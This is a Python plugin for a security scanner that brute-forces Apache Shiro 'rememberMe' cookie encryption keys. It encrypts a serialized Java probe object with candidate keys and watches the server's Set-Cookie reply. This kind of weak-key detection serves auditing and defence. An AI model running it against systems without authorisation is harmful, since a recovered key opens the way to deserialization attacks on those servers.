import base64
from Cryptodome.Cipher import AES
import uuid
from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req, get_logger, random_choices
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.BRUTE
        self.vul_name = "Shiro CBC 弱密钥"
        self.app_name = 'Shiro'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

        self.username_file = "username_shiro.txt"
        self.password_file = "password_shiro.txt"
        self.shuffle_auth_list = True
        self._cookie_name = "rememberMe"
        self._check_value = self._cookie_name + "=deleteMe"

    def login(self, target, user, passwd):
        return self.check_key(passwd)

    def check_app(self, target):
        set_cookie = self.send_encrypt("1")
        if self._check_value in set_cookie:
            self.logger.debug("found shiro {}".format(target))
            return True
        else:
            return False

    def send_encrypt(self, data):
        url = self.target + "/"
        url = url + "?" + random_choices() + "=" + random_choices()
        headers = {
            "Cookie": '{}={}'.format(self._cookie_name, data)
        }
        set_cookie = http_req(url, headers=headers).headers.get('Set-Cookie', "")
        return set_cookie

    def check_key(self, key):
        payload = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBw                                                                                                              dwEAeA=="
        data = shiro_cbc(key, payload).decode()
        set_cookie = self.send_encrypt(data)
        if self._check_value not in set_cookie:
            return True


def shiro_cbc(key, data):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(base64.b64decode(data))))
    return base64_ciphertext
